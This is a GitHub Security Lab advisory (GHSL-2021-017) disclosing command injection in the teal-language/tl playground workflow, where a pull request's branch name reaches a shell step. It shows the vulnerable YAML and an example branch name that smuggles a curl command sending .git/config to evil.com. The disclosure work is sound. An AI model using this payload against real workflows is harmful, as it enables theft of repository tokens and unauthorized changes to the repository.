<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">February 3, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-017: Command injection in teal-language/tl workflow</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2021-01-18: Report sent to maintainers.</li>
  <li>2021-01-18: Issue resolved.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/teal-language/tl/blob/master/.github/workflows/playground.yml">playground</a> GitHub workflow is vulnerable to unauthorized modification of the base repository or secrets exfiltration from a Pull Request.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/teal-language/tl">teal-language/tl</a> repository</p>

<h2 id="tested-version">Tested Version</h2>

<p>The latest changeset of <a href="https://github.com/teal-language/tl/blob/2b8d57239540191070967414551b1938438a8db2/.github/workflows/playground.yml">playground.yml</a> to the date.</p>

<h2 id="details">Details</h2>

<h3 id="issue-a-branch-name-from-the-pull-request-is-used-to-format-a-shell-command">Issue: A branch name from the pull request is used to format a shell command</h3>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">on</span><span class="pi">:</span>
  <span class="na">pull_request_target</span><span class="pi">:</span>
    <span class="na">branches</span><span class="pi">:</span> <span class="pi">[</span> <span class="nv">master</span> <span class="pi">]</span>
<span class="nn">...</span>
    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">build</span>
      <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
        <span class="s">echo "${{ github.event.pull_request.head.repo.full_name }}/${{ github.head_ref }}"</span>
        <span class="s">cd ${{ github.workspace }}/teal-playground</span>
        <span class="s">yarn build</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary command injection into the bash script which allows for unauthorized modification of the base repository and secrets exfiltration. For example a PR from branch named <code class="language-plaintext highlighter-rouge">a";${IFS}curl${IFS}-d${IFS}@.git/config${IFS}evil.com${IFS}#</code> would exfiltrate the repository token to the attacker controlled server.</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-017</code> in any communication regarding this issue.</p>

   